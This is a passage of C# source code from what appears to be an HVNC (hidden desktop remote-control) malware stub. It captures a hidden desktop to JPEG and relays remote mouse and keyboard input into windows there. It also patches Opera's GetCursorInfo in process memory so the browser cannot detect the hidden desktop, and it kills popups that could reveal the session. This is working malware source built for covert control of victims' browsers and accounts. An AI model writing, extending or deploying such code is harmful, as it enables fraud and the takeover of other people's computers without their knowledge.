            DrawIconEx(_compHdc, _curX, _curY, hArrow, 0, 0, 0, 0, 3 /*DI_NORMAL*/);

        return true;
    }

    // JPEG path — captures composite and encodes to JPEG bytes.
    private static unsafe byte[]? CaptureFrame()
    {
        if (!CaptureComposite()) return null;
        // DIBSection pixels in _compBits are BGRA (PixelFormat32bppARGB / 0x26200A)
        return EncodeJpeg(_compBits, _canvasW, _canvasH, _canvasW * 4);
    }

    // ── Composite DIBSection ──────────────────────────────────────────────────

    private static bool EnsureComposite(int w, int h)
    {
        if (_compHdc != 0 && _compW == w && _compH == h) return true;
        FreeComposite();
        _compHdc = CreateCompatibleDC(_compHdcRef);
        if (_compHdc == 0) return false;
        var bmi = MakeBmi(w, h);
        _compHbm = CreateDIBSection(_compHdcRef, ref bmi, DIB_RGB_COLORS, out _compBits, 0, 0);
        if (_compHbm == 0 || _compBits == 0) { FreeComposite(); return false; }
        SelectObject(_compHdc, _compHbm);
        _compW = w; _compH = h;
        return true;
    }

    private static void FreeComposite()
    {
        if (_compHbm != 0) { DeleteObject(_compHbm); _compHbm = 0; }
        if (_compHdc != 0) { DeleteDC(_compHdc);     _compHdc = 0; }
        _compBits = 0; _compW = 0; _compH = 0;
    }

    // ── Window cache ──────────────────────────────────────────────────────────

    private static WinCache? GetOrCreateCache(nint hwnd, int w, int h)
    {
        if (_winCache.TryGetValue(hwnd, out var e) && e.W == w && e.H == h)
            return e;
        if (e != null) FreeCacheEntry(e);
        nint hdc = CreateCompatibleDC(_compHdcRef);
        if (hdc == 0) return null;
        var bmi = MakeBmi(w, h);
        nint hbm = CreateDIBSection(_compHdcRef, ref bmi, DIB_RGB_COLORS, out nint bits, 0, 0);
        if (hbm == 0 || bits == 0) { DeleteDC(hdc); return null; }
        SelectObject(hdc, hbm);
        var entry = new WinCache { Hdc = hdc, Hbm = hbm, Bits = bits, W = w, H = h };
        _winCache[hwnd] = entry;
        return entry;
    }

    private static void FreeCacheEntry(WinCache e)
    {
        if (e.Hbm != 0) DeleteObject(e.Hbm);
        if (e.Hdc != 0) DeleteDC(e.Hdc);
    }

    private static void FreeWinCache()
    {
        foreach (var e in _winCache.Values) FreeCacheEntry(e);
        _winCache.Clear();
    }

    private static BITMAPINFO MakeBmi(int w, int h) => new()
    {
        bmiHeader = new BITMAPINFOHEADER
        {
            biSize        = (uint)Marshal.SizeOf<BITMAPINFOHEADER>(),
            biWidth       = w,
            biHeight      = -h, // negative = top-down
            biPlanes      = 1,
            biBitCount    = 32,
            biCompression = BI_RGB
        },
        bmiColors = new uint[4]
    };

    // ── JPEG encoding ─────────────────────────────────────────────────────────

    private static unsafe byte[]? EncodeJpeg(nint pixels, int w, int h, int stride)
    {
        if (_gdipToken == 0) return null;
        if (GdipCreateBitmapFromScan0(w, h, stride, 0x26200A, pixels, out nint bmp) != 0 || bmp == 0)
            return null;
        try
        {
            nint stream = SHCreateMemStream(0, 0);
            if (stream == 0) return null;
            int q  = _quality;
            var ep = new EncoderParams
            {
                Count = 1,
                Param = new EncoderParam { Guid = EncQuality, Count = 1, Type = 4, Value = (nint)(&q) }
            };
            var clsid = JpegClsid;
            GdipSaveImageToStream(bmp, stream, ref clsid, (nint)(&ep));
            long pos = 0;
            var vtSeek = Marshal.GetDelegateForFunctionPointer<VtSeek>((*(nint**)stream)[5]);
            vtSeek(stream, 0, 0, ref pos);
            var chunks = new List<byte[]>();
            int total  = 0;
            var buf    = new byte[65536];
            fixed (byte* pbuf = buf)
            {
                var vtRead = Marshal.GetDelegateForFunctionPointer<VtRead>((*(nint**)stream)[3]);
                while (true)
                {
                    uint cbRead = 0;
                    vtRead(stream, (nint)pbuf, (uint)buf.Length, out cbRead);
                    if (cbRead == 0) break;
                    var chunk = new byte[cbRead];
                    Buffer.BlockCopy(buf, 0, chunk, 0, (int)cbRead);
                    chunks.Add(chunk); total += (int)cbRead;
                }
            }
            Marshal.GetDelegateForFunctionPointer<VtRelease>((*(nint**)stream)[2])(stream);
            if (total == 0) return null;
            var result = new byte[total]; int off = 0;
            foreach (var c in chunks) { Buffer.BlockCopy(c, 0, result, off, c.Length); off += c.Length; }
            return result;
        }
        finally { GdipDisposeImage(bmp); }
    }

    private static void EnsureGdiplus()
    {
        if (_gdipToken != 0) return;
        var inp = new GdiplusInput { Version = 1 };
        GdiplusStartup(out _gdipToken, ref inp, 0);
    }

    // ── Input dispatch ────────────────────────────────────────────────────────

    private static string WinClass(nint hwnd)
    {
        var sb = new System.Text.StringBuilder(128);
        GetClassName(hwnd, sb, 128);
        return sb.ToString();
    }

    // Converts a VK to character(s) using our tracked modifier state.
    // Returns null if no printable translation exists.
    private static string? VkToChars(int vk)
    {
        var state = new byte[256];
        if (_shiftDown) state[0x10] = 0x80; // VK_SHIFT
        if (_ctrlDown)  state[0x11] = 0x80; // VK_CONTROL
        if (_altDown)   state[0x12] = 0x80; // VK_MENU
        if (_capsLock)  state[0x14] = 0x01; // VK_CAPITAL (toggle bit)
        uint scan = MapVirtualKey((uint)vk, 0);
        var sb = new System.Text.StringBuilder(8);
        int n = ToUnicode((uint)vk, scan, state, sb, 8, 0);
        return n > 0 ? sb.ToString(0, n) : null;
    }

    private static void ProcessInput(HvncInputDataStub inp)
    {
        switch (inp.T)
        {
            case "mm": HandleMouseMove(inp.X, inp.Y);                        break;
            case "mc": HandleMouseButton(inp.X, inp.Y, inp.Button, inp.Down); break;
            case "mw": HandleMouseWheel(inp.WheelDelta);                     break;
            case "kd": HandleKey(inp.VK, true);                              break;
            case "ku": HandleKey(inp.VK, false);                             break;
        }
    }

    // Returns true if hwnd is part of the Windows taskbar (Shell_TrayWnd).
    // Taskbar windows receive mouse clicks normally but should not receive SetForegroundWindow.
    private static bool IsTaskbar(nint hwnd)
    {
        if (hwnd == 0) return false;
        nint r = GetAncestor(hwnd, GA_ROOT);
        return WinClass(r != 0 ? r : hwnd) == "Shell_TrayWnd";
    }

    // Walks child window tree to find a window with the given class name.
    private static nint FindChildByClass(nint parent, string cls)
    {
        nint child = GetWindow(parent, 5 /*GW_CHILD*/);
        while (child != 0)
        {
            if (WinClass(child) == cls) return child;
            nint found = FindChildByClass(child, cls);
            if (found != 0) return found;
            child = GetWindow(child, 2 /*GW_HWNDNEXT*/);
        }
        return 0;
    }

    // Walks the child window tree looking for Win11 taskbar's XAML input target.
    // Win11 taskbar hosts its app icons in a WinUI3/XAML island. PostMessage to the outer
    // Shell_TrayWnd or DesktopWindowContentBridge is swallowed by the composition layer.
    // The only window that processes WM_LBUTTONDOWN is Windows.UI.Input.InputSite.WindowClass.
    private static nint FindInputSite(nint parent)
    {
        nint child = GetWindow(parent, 5 /*GW_CHILD*/);
        while (child != 0)
        {
            if (WinClass(child) == "Windows.UI.Input.InputSite.WindowClass")
                return child;
            nint found = FindInputSite(child);
            if (found != 0) return found;
            child = GetWindow(child, 2 /*GW_HWNDNEXT*/);
        }
        return 0;
    }

    // Returns the topmost REAL window at pt, making desktop-background overlay windows transparent.
    // Shell_TrayWnd (taskbar) is intentionally NOT made transparent so taskbar buttons can be clicked.
    private static nint SmartWindowFromPoint(POINT pt)
    {
        const int GWL_EXSTYLE       = -20;
        const int WS_EX_TRANSPARENT = 0x00000020;

        for (int attempt = 0; attempt < 4; attempt++)
        {
            nint hwnd = WindowFromPoint(pt);
            if (hwnd == 0) return 0;
            string cls = WinClass(hwnd);
            if (cls is "UserOOBEWindowClass" or "WorkerW" or "Progman")
            {
                // Add WS_EX_TRANSPARENT so WindowFromPoint skips desktop background windows.
                // One-time operation per window — no Z-order change, icons remain visible.
                int ex = GetWindowLong(hwnd, GWL_EXSTYLE);
                if ((ex & WS_EX_TRANSPARENT) == 0)
                    SetWindowLong(hwnd, GWL_EXSTYLE, ex | WS_EX_TRANSPARENT);
                continue;
            }
            return hwnd;
        }
        return WindowFromPoint(pt);
    }

    private static void HandleMouseMove(int x, int y)
    {
        _curX = x; _curY = y;
        SetCursorPos(x, y);

        // Window is being dragged — move it directly
        if (_movingWindow && _movingHwnd != 0)
        {
            SetWindowPos(_movingHwnd, 0, x - _moveOffX, y - _moveOffY, _moveSizeW, _moveSizeH,
                         0x0014 /*SWP_NOZORDER|SWP_NOACTIVATE*/);
            return;
        }

        var pt    = new POINT { x = x, y = y };
        nint hwnd = SmartWindowFromPoint(pt);
        if (hwnd == 0) return;

        ActivateIfNewWindow(hwnd);
        var cPt = pt;
        ScreenToClient(hwnd, ref cPt);
        // Pass MK_LBUTTON when LButton is held — Qt/Electron will synthesize a fake
        // MouseButtonRelease if wParam=0 arrives while they believe LButton is pressed.
        nint moveWParam = _leftButtonDown ? (nint)MK_LBUTTON : 0;
        PostMessage(hwnd, WM_MOUSEMOVE, moveWParam, MakeLParam(cPt.x, cPt.y));
    }

    private static void HandleMouseButton(int x, int y, int button, bool down)
    {
        _curX = x; _curY = y;
        SetCursorPos(x, y);
        // Track LButton state — HandleMouseMove uses this for correct WM_MOUSEMOVE wParam
        if (button == 0) _leftButtonDown = down;

        // End window drag on left-button-up
        if (button == 0 && !down && _movingWindow)
        {
            SetWindowPos(_movingHwnd, 0, x - _moveOffX, y - _moveOffY, _moveSizeW, _moveSizeH,
                         0x0014 /*SWP_NOZORDER|SWP_NOACTIVATE*/);
            _movingWindow = false; _movingHwnd = 0;
            _lbDownHwnd   = 0;
            // Close the WM_LBUTTONDOWN we forwarded on caption mousedown (Opera/Chromium/Qt custom frames).
            if (_captionFwdHwnd != 0)
            {
                nint fwd = _captionFwdHwnd; _captionFwdHwnd = 0;
                var cUp = new POINT { x = x, y = y };
                ScreenToClient(fwd, ref cUp);
                PostMessage(fwd, WM_LBUTTONUP, 0, MakeLParam(cUp.x, cUp.y));
            }
            return;
        }

        var pt    = new POINT { x = x, y = y };
        nint hwnd = SmartWindowFromPoint(pt);
        if (hwnd == 0) return;

        nint root = GetAncestor(hwnd, GA_ROOT);
        if (root == 0) root = hwnd;

        if (down)
        {
            nint prevRoot = _lastHwnd != 0 ? GetAncestor(_lastHwnd, GA_ROOT) : 0;
            if (prevRoot == 0) prevRoot = _lastHwnd;
            if (!IsContextMenuOrPopup(prevRoot, root)) ActivateWindow(root, hwnd);
        }

        if (button == 0)
        {
            // NC hit-test: on hidden desktops DWM is inactive. Modern apps (Explorer, Qt, Electron)
            // use DwmExtendFrameIntoClientArea so DefWindowProc returns HTCLIENT for the entire
            // caption area. RefineNCHit also converts HTCLIENT → correct button using geometry.
            nint lpHit = MakeLParam(x, y);
            // Hit-test hwnd (window under cursor), not root.
            // If hwnd is a child widget (Telegram inline button, Qt widget), it returns HTCLIENT
            // and the click flows through normally. If hwnd == root (empty title-bar area or
            // a single-HWND Chromium window), it may return HTCAPTION and drag starts.
            // RefineNCHit still uses root geometry to locate close/min/max buttons.
            int  hit   = RefineNCHit(SafeNCHitTest(hwnd, lpHit), root, x, y);

            // After RefineNCHit, HTCLIENT that was promoted to HTCAPTION/HTCLOSE/etc. is now
            // a non-client result we can act on. Accept any non-zero result that isn't HTCLIENT.
            if (hit != 0 && hit != HTCLIENT)
            {
                if (down && hit == HTCAPTION)
                {
                    GetWindowRect(root, out var wr);
                    _movingWindow = true;
                    _movingHwnd   = root;
                    _moveOffX     = x - wr.left;
                    _moveOffY     = y - wr.top;
                    _moveSizeW    = wr.right  - wr.left;
                    _moveSizeH    = wr.bottom - wr.top;
                    // Forward WM_LBUTTONDOWN to the actual hit window so Chromium/Qt custom frames
                    // (Opera, Brave, Telegram) receive the click — they use HTCAPTION for clickable
                    // areas (tab strip, toolbar) and process input via client-area messages.
                    var cFwd = new POINT { x = x, y = y };
                    ScreenToClient(hwnd, ref cFwd);
                    PostMessage(hwnd, WM_LBUTTONDOWN, (nint)MK_LBUTTON, MakeLParam(cFwd.x, cFwd.y));
                    _captionFwdHwnd = hwnd;
                    return;
                }
                if (!down)
                {
                    if (hit == HTCLOSE)
                    {
                        // Qt/custom-frame apps (Telegram, AyuGram) need WM_LBUTTONUP on the hit window
                        // so their close button widget fires clicked(). WM_CLOSE to root handles Win32 windows.
                        var cClose = new POINT { x = x, y = y };
                        ScreenToClient(hwnd, ref cClose);
                        PostMessage(hwnd, WM_LBUTTONUP, 0, MakeLParam(cClose.x, cClose.y));
                        PostMessage(root, WM_CLOSE, 0, 0);
                        // Explorer with a media preview can take several seconds to handle WM_CLOSE
                        // (preview handler flushes video decode buffers). Force-kill after 1.5 s.
                        string closeCls = WinClass(root);
                        if (closeCls is "CabinetWClass" or "ExploreWClass")
                        {
                            GetWindowThreadProcessId(root, out uint closePid);
                            if (closePid != 0)
                                Task.Run(async () =>
                                {
                                    await Task.Delay(1500);
                                    nint hp = OpenProcess(0x0001, false, closePid);
                                    if (hp != 0) { TerminateProcess(hp, 0); CloseHandle(hp); }
                                });
                        }
                        return;
                    }
                    if (hit == HTMAXBUTTON)
                        { ShowWindow(root, IsWindowMaximized(root) ? 9 /*SW_RESTORE*/ : 3 /*SW_SHOWMAXIMIZED*/); return; }
                    if (hit == HTMINBUTTON)
                    {
                        // WM_SYSCOMMAND SC_MINIMIZE is more reliable than ShowWindow(SW_MINIMIZE)
                        // for Chromium browsers on a hidden desktop (no taskbar to anchor minimised state).
                        PostMessage(root, 0x0112 /*WM_SYSCOMMAND*/, 0xF020 /*SC_MINIMIZE*/, 0);
                        return;
                    }
                }
            }

        }

        // UIItemsView (Win11 Explorer file grid) and DirectUIHWND ignore PostMessage because
        // DirectManipulation intercepts their input queue. Send via SendMessageTimeout directly —
        // no parent walk needed
        string cls = WinClass(hwnd);
        bool origIsUia = cls is "UIItemsView" or "DirectUIHWND";
        // Qt apps (Telegram, AyuGram, etc.) need synchronous delivery so Qt's event loop
        // fully processes MOVE → DOWN → MOVE(MK_LBN) → UP in order.  PostMessage can
        // leave a wParam=0 MOUSEMOVE between DOWN and UP, causing Qt to synthesize a
        // fake release before our real UP arrives and killing the click action.
        bool isQt = cls.StartsWith("Qt5") || cls.StartsWith("Qt6") || cls.StartsWith("Qt4");
        bool useSync = origIsUia || isQt;

        if (origIsUia && !_loggedUiaChain)
        {
            _loggedUiaChain = true;
            var chain = new System.Text.StringBuilder("[UIItemsView] chain:");
            nint cur = hwnd;
            for (int i = 0; i < 16; i++)
            {
                cur = GetParent(cur);
                if (cur == 0) break;
                chain.Append(" [" + WinClass(cur) + "]");
                if (cur == root) break;
            }
            StubLog.Info(chain.ToString());
        }

        var cPt = pt;
        ScreenToClient(hwnd, ref cPt);
        nint lParam   = MakeLParam(cPt.x, cPt.y);
        nint scrParam = MakeLParam(x, y);

        StubLog.Debug($"[Mouse] btn={button} down={down} ({x},{y}) hwnd=0x{hwnd:X} [{WinClass(hwnd)}] cPt=({cPt.x},{cPt.y})");

        switch (button)
        {
            case 0: // Left — server sends button=0
            {
                if (down)
                {
                    // Double-click: 800ms window, 8px radius (generous for network jitter)
                    long now   = Environment.TickCount64;
                    bool isDbl = (now - _lastLeftMs) < 800 &&
                                 Math.Abs(x - _lastClickX) < 8 &&
                                 Math.Abs(y - _lastClickY) < 8;
                    _lastLeftMs = now;
                    _lastClickX = x;
                    _lastClickY = y;

                    StubLog.Info($"[Mouse] {(isDbl ? "DBLCLICK" : "LDOWN")} → 0x{hwnd:X} [{WinClass(hwnd)}]");
                    if (useSync)
                    {
                        // Qt needs WM_MOUSEMOVE processed before DOWN so hover/underMouse state
                        // is established in the correct widget before mousePressEvent fires.
                        if (isQt)
                            SendMessageTimeout(hwnd, WM_MOUSEMOVE, 0, lParam, SMTO_ABORTIFHUNG, 50, out _);
                        SendMessageTimeout(hwnd, WM_LBUTTONDOWN, (nint)MK_LBUTTON, lParam, SMTO_ABORTIFHUNG, 200, out _);
                        _lbDownHwnd = hwnd;
                        if (isDbl && origIsUia)
                        {
                            SendMessageTimeout(hwnd, WM_LBUTTONDBLCLK, (nint)MK_LBUTTON, lParam, SMTO_ABORTIFHUNG, 200, out _);
                            uint scanRet = MapVirtualKey(0x0D, 0);
                            PostMessage(root, WM_KEYDOWN, 0x0D, (nint)(1u | (scanRet << 16)));
                            PostMessage(root, WM_KEYUP,   0x0D, unchecked((nint)(0xC0000001u | (scanRet << 16))));
                        }
                        else if (isDbl)
                        {
                            SendMessageTimeout(hwnd, WM_LBUTTONDBLCLK, (nint)MK_LBUTTON, lParam, SMTO_ABORTIFHUNG, 200, out _);
                        }
                    }
                    else
                    {
                        // WM_MOUSEMOVE first: Qt and Electron apps track hover state and
                        // won't fire click handlers if the cursor "appears" without moving there.
                        PostMessage(hwnd, WM_MOUSEMOVE, 0, lParam);
                        PostMessage(hwnd, WM_LBUTTONDOWN, (nint)MK_LBUTTON, lParam);
                        _lbDownHwnd = hwnd;
                        if (isDbl)
                            PostMessage(hwnd, WM_LBUTTONDBLCLK, (nint)MK_LBUTTON, lParam);
                    }
                }
                else
                {
                    // Use the hwnd that got WM_LBUTTONDOWN — Qt/Electron clicked() fires only if
                    // UP goes to the same widget as DOWN. Mouse jitter (1-2px) can cause
                    // SmartWindowFromPoint to return a different child widget on UP.
                    nint upTarget = (_lbDownHwnd != 0 && _lbDownHwnd != hwnd) ? _lbDownHwnd : hwnd;
                    _lbDownHwnd = 0;
                    if (upTarget != hwnd)
                    {
                        var upPt = new POINT { x = x, y = y };
                        ScreenToClient(upTarget, ref upPt);
                        lParam = MakeLParam(upPt.x, upPt.y);
                    }
                    // WM_MOUSEMOVE with MK_LBUTTON just before release keeps Qt's hover/underMouse
                    // state valid so mouseReleaseEvent fires the click action.
                    // Send synchronously for Qt so nothing slips between MOVE and UP.
                    if (useSync)
                        SendMessageTimeout(upTarget, WM_MOUSEMOVE, (nint)MK_LBUTTON, lParam, SMTO_ABORTIFHUNG, 50, out _);
                    else
                        PostMessage(upTarget, WM_MOUSEMOVE, (nint)MK_LBUTTON, lParam);
                    if (useSync)
                        SendMessageTimeout(upTarget, WM_LBUTTONUP, 0, lParam, SMTO_ABORTIFHUNG, 200, out _);
                    else
                        PostMessage(upTarget, WM_LBUTTONUP, 0, lParam);
                }
                break;
            }
            case 1: // Right — server sends button=1
            {
                // Send only WM_RBUTTONDOWN/WM_RBUTTONUP — the window's DefWindowProc generates
                // WM_CONTEXTMENU from WM_RBUTTONUP automatically. Posting it explicitly caused
                // two menus to open, the second instantly dismissing the first.
                PostMessage(hwnd, down ? WM_RBUTTONDOWN : WM_RBUTTONUP,
                            down ? (nint)MK_RBUTTON : 0, lParam);
                break;
            }
            default: // Middle — server sends button=2
            {
                PostMessage(hwnd, down ? WM_MBUTTONDOWN : WM_MBUTTONUP,
                            down ? (nint)MK_MBUTTON : 0, lParam);
                break;
            }
        }
    }

    private static void HandleMouseWheel(int delta)
    {
        nint hwnd = WindowFromPoint(new POINT { x = _curX, y = _curY });
        if (hwnd == 0) hwnd = _lastHwnd;
        if (hwnd == 0) return;
        nint wp = (nint)(((uint)(short)delta << 16) & 0xFFFF0000);
        PostMessage(hwnd, WM_MOUSEWHEEL, wp, MakeLParam(_curX, _curY));
    }

    private static void HandleKey(int vk, bool down)
    {
        // Update modifier state before any logic so VkToChars uses correct state
        switch (vk)
        {
            case 0x10: case 0xA0: case 0xA1: _shiftDown = down; break; // Shift
            case 0x11: case 0xA2: case 0xA3: _ctrlDown  = down; break; // Ctrl
            case 0x12: case 0xA4: case 0xA5: _altDown   = down; break; // Alt
            case 0x14: if (down) _capsLock = !_capsLock; break;         // CapsLock toggle
        }

        nint hwnd = WindowFromPoint(new POINT { x = _curX, y = _curY });
        if (hwnd == 0) hwnd = _lastHwnd;
        if (hwnd == 0) hwnd = GetForegroundWindow();
        if (hwnd == 0) return;

        nint root = GetAncestor(hwnd, GA_ROOT);
        if (root == 0) root = hwnd;

        // Route keys to the thread's focused widget (e.g., active text field), not the window under
        // the cursor. Unconditional ActivateWindow → SetFocus(hwnd) steals focus from text fields
        // whenever the cursor drifts over a non-focusable widget.
        uint tid = GetWindowThreadProcessId(root, out _);
        if (tid != 0)
        {
            var gi = new GUITHREADINFO { cbSize = (uint)System.Runtime.InteropServices.Marshal.SizeOf<GUITHREADINFO>() };
            if (GetGUIThreadInfo(tid, ref gi) && gi.hwndFocus != 0)
                hwnd = gi.hwndFocus;
        }

        uint scan = MapVirtualKey((uint)vk, 0);
        nint lpDn = (nint)(1u | (scan << 16));
        nint lpUp = unchecked((nint)(0xC0000001u | (scan << 16)));

        // Modifier keys: send WM_KEYDOWN/WM_KEYUP so the target thread's GetKeyState is updated.
        // Windows apps check GetKeyState(VK_CONTROL) when processing VK_A — they see it as pressed
        // only if WM_KEYDOWN(VK_CONTROL) was previously dequeued by that same thread. This is
        // required for Ctrl+A (select all), Ctrl+C, Ctrl+Z, etc. to work in Explorer, browsers, etc.
        bool isModifier = vk is 0x10 or 0xA0 or 0xA1 or 0x11 or 0xA2 or 0xA3 or 0x12 or 0xA4 or 0xA5 or 0x14;
        if (isModifier)
        {
            PostMessage(hwnd, down ? WM_KEYDOWN : WM_KEYUP, (nint)vk, down ? lpDn : lpUp);
            return;
        }

        // Ctrl+letter (A–Z): dual message.
        //   WM_KEYDOWN(VK_A): Chrome's accelerator system checks key state when processing this,
        //   sees VK_CONTROL held (from the earlier WM_KEYDOWN(VK_CONTROL)), and executes the action.
        //   WM_CHAR(0x01):  Win32 Edit controls and Blink text fields execute select-all directly
        //   from the control character, independent of key state.
        if (down && _ctrlDown && !_altDown && vk >= 0x41 && vk <= 0x5A)
        {
            PostMessage(hwnd, WM_KEYDOWN, (nint)vk, lpDn);
            PostMessage(hwnd, WM_CHAR, (nint)(vk - 0x40), 1); // Ctrl+A→0x01, Ctrl+C→0x03, Ctrl+Z→0x1A
            return;
        }

        // Printable key without Ctrl/Alt: WM_CHAR with correctly shifted/capped character.
        if (down && !IsNonPrintableVK(vk) && !_ctrlDown && !_altDown)
        {
            string? chars = VkToChars(vk);
            if (chars != null && chars.Length > 0)
            {
                foreach (char ch in chars)
                    PostMessage(hwnd, WM_CHAR, (nint)ch, 1);
                return;
            }
        }

        // All other keys: WM_KEYDOWN/WM_KEYUP (Delete, Enter, arrows, F-keys, Ctrl+non-letter…)
        PostMessage(hwnd, down ? WM_KEYDOWN : WM_KEYUP, (nint)vk, down ? lpDn : lpUp);
    }

    // ── Input helpers ─────────────────────────────────────────────────────────

    // Returns true if root is a native context menu (#32768) or an app-rendered popup of the
    // same process as prevRoot (e.g. Chrome/Edge dropdown menus, WS_POPUP style).
    // Regular app windows — even from the same exe (two Explorer windows) — are NOT popups and
    // will return false, so activation still happens and input works correctly.
    private static bool IsContextMenuOrPopup(nint prevRoot, nint root)
    {
        if (root == 0) return false;
        if (WinClass(root) == "#32768") return true;  // native TrackPopupMenu
        // App-rendered popup: WS_POPUP style + same process as the window that spawned it.
        const int  GWL_STYLE = -16;
        const uint WS_POPUP  = 0x80000000;
        bool isPopup = ((uint)GetWindowLong(root, GWL_STYLE) & WS_POPUP) != 0;
        if (!isPopup) return false;
        // Only suppress activation if this popup belongs to the same process (e.g. browser context menu).
        if (prevRoot == 0) return false;
        GetWindowThreadProcessId(prevRoot, out uint pidPrev);
        GetWindowThreadProcessId(root,     out uint pidNew);
        return pidPrev != 0 && pidPrev == pidNew;
    }

    private static void ActivateIfNewWindow(nint hwnd)
    {
        nint root     = GetAncestor(hwnd, GA_ROOT); if (root == 0) root = hwnd;
        nint prevRoot = _lastHwnd != 0 ? GetAncestor(_lastHwnd, GA_ROOT) : 0;
        if (prevRoot == 0) prevRoot = _lastHwnd;
        _lastHwnd = hwnd;
        if (prevRoot == root) return;                                 // same window — no-op
        if (IsContextMenuOrPopup(prevRoot, root)) return;             // menu/popup — don't dismiss it
        if (IsTaskbar(root)) return;                                  // taskbar — don't steal focus
        // Same-process windows (Telegram main ↔ floating dialog): activating the new root
        // dismisses the dialog. Skip activation for intra-process window transitions.
        GetWindowThreadProcessId(root,     out uint pidNew);
        GetWindowThreadProcessId(prevRoot, out uint pidPrev2);
        if (pidPrev2 != 0 && pidPrev2 == pidNew) return;
        ActivateWindow(root, hwnd);
    }

    private static void ActivateWindow(nint root, nint hwnd)
    {
        SetForegroundWindow(root);
        SetActiveWindow(root);
        SetFocus(hwnd);
        _lastHwnd = hwnd;
    }

    private static int SafeNCHitTest(nint hwnd, nint lparam)
    {
        // 30ms cap: SendMessage (unbounded) added 100ms+ click latency on sluggish windows.
        // DWM hit-test always responds well within 30ms on any modern hardware.
        SendMessageTimeout(hwnd, WM_NCHITTEST, 0, lparam, SMTO_ABORTIFHUNG, 30, out nint r);
        return (int)r;
    }

    // On hidden desktops DwmDefWindowProc is inactive.
    // Classic apps: WM_NCHITTEST returns HTCAPTION for the whole title bar.
    // Modern apps (Explorer, Qt/Telegram, Electron) call DwmExtendFrameIntoClientArea which makes
    // DefWindowProc return HTCLIENT for the entire caption area — buttons included.
    // In all ambiguous cases, fall back to geometry-based button identification.
    private static int RefineNCHit(int hit, nint root, int x, int y)
    {
        // Pass through anything already specific (HTCLOSE=20, HTMAXBUTTON=9, etc.)
        if (hit != HTCAPTION && hit != HTCLIENT && hit != 0) return hit;

        // HTCLIENT apps (Qt/Telegram, Electron) return HTCLIENT for their entire window and
        // handle all input — including their own close/max/min buttons — internally.
        // Converting HTCLIENT to HTCLOSE/HTMAX/HTMIN based on geometry would mistake
        // custom toolbar buttons (Search, More, etc.) in the right-edge zone for system buttons
        // and call ShowWindow(minimize) or WM_CLOSE instead of forwarding the click.
        if (hit == HTCLIENT) return HTCLIENT;

        // For HTCAPTION / 0: apply geometry to detect system buttons vs draggable area.
        // Standard Win32 windows return HTCAPTION for the title bar but not for individual buttons.
        if (!GetWindowRect(root, out var wr)) return hit;
        int border = GetSystemMetrics(8);  // SM_CXSIZEFRAME
        int cy     = GetSystemMetrics(4);  // SM_CYCAPTION
        int btnW   = cy * 2;               // ≈46px at 100% DPI
        int barTop = wr.top;
        int barBot = wr.top + cy * 2 + border;
        if (y < barTop || y > barBot) return HTCAPTION;
        if (x < wr.left || x > wr.right) return HTCAPTION;
        if (x >= wr.right - btnW)     return HTCLOSE;
        if (x >= wr.right - btnW * 2) return HTMAXBUTTON;
        if (x >= wr.right - btnW * 3) return HTMINBUTTON;
        return HTCAPTION;
    }

    // ── Opera GetCursorInfo patch ──────────────────────────────────────────────
    // Opera detects hidden desktops by calling GetCursorInfo — if it returns FALSE (which happens
    // when the calling thread is on a desktop different from the cursor's desktop), Opera disables
    // its mouse input pipeline entirely.
    // return TRUE (mov eax,1; ret) so Opera never sees the failure.

    private static void PatchCursorInfoAsync(uint pid)
    {
        new Thread(() =>
        {
            for (int i = 0; i < 15; i++)
            {
                Thread.Sleep(2000);
                if (PatchCursorInfo(pid))
                {
                    StubLog.Info($"[HVNC] Opera GetCursorInfo patched (pid={pid}, attempt={i + 1})");
                    return;
                }
            }
            StubLog.Error($"[HVNC] Opera GetCursorInfo patch failed after 15 attempts (pid={pid})");
        }) { IsBackground = true, Name = "OperaPatch" }.Start();
    }

    private static bool PatchCursorInfo(uint pid)
    {
        const uint PROCESS_VM_WRITE     = 0x0020;
        const uint PROCESS_VM_OPERATION = 0x0008;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        // GetCursorInfo VA is identical across all processes on the same boot (ASLR per-boot).
        nint user32 = GetModuleHandleW("user32.dll");
        if (user32 == 0) return false;
        nint addr = GetProcAddress(user32, "GetCursorInfo");
        if (addr == 0) return false;

        nint hProc = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, false, pid);
        if (hProc == 0) return false;
        try
        {
            // mov eax, 1; ret — always returns TRUE without touching the CURSORINFO struct
            byte[] patch = [0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3];
            if (!VirtualProtectEx(hProc, addr, (uint)patch.Length, PAGE_EXECUTE_READWRITE, out uint oldProt))
                return false;
            int written = 0;
            bool ok = WriteProcessMemory(hProc, addr, patch, patch.Length, ref written);
            VirtualProtectEx(hProc, addr, (uint)patch.Length, oldProt, out _);
            return ok && written == patch.Length;
        }
        finally { CloseHandle(hProc); }
    }

    // After Explorer starts on the hidden desktop, mscories.dll,Install (Rundll32) fires a
    // .NET Framework setup popup. Kill Rundll32 both as Explorer child AND via desktop enumeration.
    // Start immediately — the popup fires within milliseconds of Explorer starting.
    private static void SuppressMscoriesAsync(uint explorerPid)
    {
        new Thread(() =>
        {
            var sw = System.Diagnostics.Stopwatch.StartNew();
            while (sw.Elapsed.TotalSeconds < 10)
            {
                KillChildRundll32(explorerPid);
                KillRundll32OnHvncDesktop();
                Thread.Sleep(sw.Elapsed.TotalSeconds < 3 ? 80 : 400);
            }
        }) { IsBackground = true, Name = "ExplorerJunk" }.Start();
    }

    // Kill Rundll32 children of the given parent (e.g. direct Explorer children).
    private static void KillChildRundll32(uint parentPid)
    {
        const uint TH32CS_SNAPPROCESS = 0x00000002;
        const uint PROCESS_TERMINATE  = 0x0001;
        nint snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == (nint)(-1) || snap == 0) return;
        try
        {
            var pe = new PROCESSENTRY32W { dwSize = (uint)Marshal.SizeOf<PROCESSENTRY32W>() };
            if (!Process32FirstW(snap, ref pe)) return;
            do
            {
                if (pe.th32ParentProcessID == parentPid &&
                    pe.szExeFile.Equals("rundll32.exe", StringComparison.OrdinalIgnoreCase))
                {
                    nint hProc = OpenProcess(PROCESS_TERMINATE, false, pe.th32ProcessID);
                    if (hProc != 0)
                    {
                        TerminateProcess(hProc, 0);
                        CloseHandle(hProc);
                        StubLog.Info($"[HVNC] Killed child rundll32 pid={pe.th32ProcessID}");
                    }
                }
                pe.dwSize = (uint)Marshal.SizeOf<PROCESSENTRY32W>();
            } while (Process32NextW(snap, ref pe));
        }
        finally { CloseHandle(snap); }
    }

